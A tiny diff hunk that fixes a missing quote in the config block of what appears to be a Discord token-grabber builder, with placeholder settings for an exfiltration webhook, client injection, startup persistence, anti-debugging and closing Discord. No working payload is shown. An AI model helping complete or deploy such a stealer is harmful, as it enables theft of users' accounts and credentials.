@@ -26,7 +26,7 @@ webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
 injection = '%Injection%' 
-Startup = '%Startup%
+Startup = '%Startup%'
 antidebugging = '%No_Debug%' 
 DiscordStop = '%Close%' 
 
